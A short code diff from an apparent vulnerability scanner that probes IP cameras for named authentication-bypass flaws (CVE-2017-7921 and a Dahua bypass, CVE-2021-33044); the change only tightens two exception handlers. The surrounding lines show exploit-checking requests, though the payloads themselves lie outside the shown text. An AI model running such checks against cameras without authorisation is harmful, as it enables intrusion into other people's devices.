@@ -19,7 +19,7 @@ class VulnerabilityScanner:
             r = requests.get(url, timeout=5)
             if r.status_code == 200 and 'admin' in r.text:
                 return {'method': 'CVE-2017-7921', 'data': r.text}
-        except:
+        except Exception:
             pass
 
         # Dahua bypass CVE-2021-33044
@@ -29,7 +29,7 @@ class VulnerabilityScanner:
             r = requests.post(url, data=data, timeout=5)
             if r.status_code == 200 and 'success' in r.text.lower():
                 return {'method': 'CVE-2021-33044'}
-        except:
+        except Exception:
             pass
 
         return None
